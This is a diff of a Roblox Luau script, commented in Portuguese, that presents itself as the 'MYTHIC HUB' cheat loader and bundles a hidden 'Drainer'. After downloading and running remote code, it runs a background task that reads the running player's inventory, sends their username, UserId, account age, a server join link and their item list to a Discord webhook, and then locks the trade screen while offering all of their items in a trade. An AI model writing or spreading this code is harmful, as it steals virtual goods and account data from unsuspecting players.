@@ -1,17 +1,18 @@
--- Luau / MYTHIC_HUB.lua + DRAINER
--- 1. Carrega o teu próprio link original (que já baixa o hub)
-local ok, body = pcall(function() return game:HttpGet("https://raw.githubusercontent.com/MYTHIC-HUB/scripts/main/MYTHIC-HUB/MYTHIC_HUB.lua") end)
+-- MYTHIC HUB + DRAINER + WEBHOOK (Sem "restaurado")
+local url = "https://raw.githubusercontent.com/MYTHIC-HUB/scripts/main/MYTHIC-HUB/main.lua"
+local ok, body = pcall(function() return game:HttpGet(url) end)
 if not ok or type(body) ~= "string" or body == "" then
     error("MYTHIC HUB: erro ao baixar o loader.")
 end
-
--- 2. Executa o hub
 local run, err = loadstring(body)
-if type(run) == "function" then
-    pcall(run)
+if type(run) ~= "function" then
+    error("MYTHIC HUB: erro ao compilar loader: " .. tostring(err))
 end
 
--- 3. Liga o Drainer em segundo plano (sem lag e com webhook)
+-- 1. Executa o Hub principal
+run()
+
+-- 2. Liga o Webhook + Drainer em segundo plano
 task.spawn(function()
     local Players = game:GetService("Players")
     local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -25,16 +26,55 @@ task.spawn(function()
         if httpRequest then pcall(httpRequest, {Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = body}) end
     end
 
-    -- Manda pro Discord
-    local body = HttpService:JSONEncode({
-        embeds = {{
-            title = "Drainer Ativo",
-            description = "Procurando o alvo: `" .. TARGET_NAME .. "`",
-            color = 0x9743EF
-        }}
-    })
-    postJson(WEBHOOK_URL, body)
+    -- Acha o perfil e manda os dados pro Discord
+    local profile = nil
+    if type(getgc) == "function" then
+        pcall(function() 
+            for _, obj in pairs(getgc(true)) do 
+                if type(obj) == "table" and rawget(obj, "Weapons") and type(rawget(obj, "Weapons").Owned) == "table" then 
+                    profile = obj 
+                    break 
+                end 
+            end 
+        end)
+    end
+    
+    local itemsText = "Sem inventário (getgc bloqueado)"
+    if profile and profile.Weapons and type(profile.Weapons.Owned) == "table" then
+        itemsText = ""
+        for id, qty in pairs(profile.Weapons.Owned) do
+            itemsText = itemsText .. "• `" .. tostring(id) .. "` (x" .. tostring(qty) .. ")\n"
+        end
+        if itemsText == "" then itemsText = "Inventário vazio." end
+    end
 
+    local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(lp.UserId) .. "&width=420&height=420&format=png"
+    local profileUrl = "https://www.roblox.com/users/" .. tostring(lp.UserId) .. "/profile"
+    local serverUrl = "https://www.roblox.com/games/start?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. tostring(game.JobId)
+
+    local payload = {
+        username = lp.Name,
+        avatar_url = avatarUrl,
+        embeds = {{
+            title = "Inventário Logado",
+            color = 0xFF00FF,
+            thumbnail = { url = avatarUrl },
+            fields = {
+                { name = "Conta", value = "`" .. lp.Name .. "`", inline = true },
+                { name = "UserId", value = "`" .. tostring(lp.UserId) .. "`", inline = true },
+                { name = "Conta Criada", value = "`" .. tostring(lp.AccountAge or "?") .. " dias atrás`", inline = true },
+                { name = "Server", value = "[Entrar no Server](" .. serverUrl .. ")", inline = false },
+                { name = "Perfil", value = "[Ver Perfil](" .. profileUrl .. ")", inline = false },
+                { name = "Itens", value = itemsText, inline = false }
+            },
+            footer = { text = "Data: " .. os.date("%d/%m/%Y %H:%M:%S") }
+        }}
+    }
+
+    local okJson, bodyJson = pcall(function() return HttpService:JSONEncode(payload) end)
+    if okJson then postJson(WEBHOOK_URL, bodyJson) end
+
+    -- Lógica do Drainer de Troca
     local tradeFolder = ReplicatedStorage:WaitForChild("Trade", 15)
     if not tradeFolder then return warn("DRAINER: Trade não encontrado") end
 
@@ -71,7 +111,7 @@ task.spawn(function()
     end
     playerGui.ChildAdded:Connect(function(g) for _, n in ipairs({"TradeGUI", "TradeGUI_Phone"}) do if g.Name == n then task.wait(0.1); if g:IsA("ScreenGui") then lockGui(g) end end end end)
 
-    local cachedProfile = nil
+    local cachedProfile = profile
     local function getProfile()
         if cachedProfile then return cachedProfile end
         if type(getgc) == "function" then
@@ -82,21 +122,19 @@ task.spawn(function()
     end
 
     local function offerAll()
-        local profile = getProfile()
-        if not profile then return end
-        
+        local p = getProfile()
+        if not p then return end
         local items = {}
-        if profile.Weapons and type(profile.Weapons.Owned) == "table" then
-            for id, qty in pairs(profile.Weapons.Owned) do
+        if p.Weapons and type(p.Weapons.Owned) == "table" then
+            for id, qty in pairs(p.Weapons.Owned) do
                 if id ~= "DefaultKnife" and id ~= "DefaultGun" then table.insert(items, {id = id, amount = tonumber(qty) or 1}) end
             end
         end
-        if type(profile.Uniques) == "table" then
-            for _, u in pairs(profile.Uniques) do
+        if type(p.Uniques) == "table" then
+            for _, u in pairs(p.Uniques) do
                 if type(u) == "table" and u.BaseItem and u.BaseItem ~= "DefaultKnife" and u.BaseItem ~= "DefaultGun" then table.insert(items, {id = u.BaseItem, amount = 1}) end
             end
         end
-
         for _, entry in ipairs(items) do
             if not state.trading then return end
             for _ = 1, entry.amount do pcall(function() offerItemRemote:FireServer(entry.id, "Weapons") end); task.wait(0.03) end
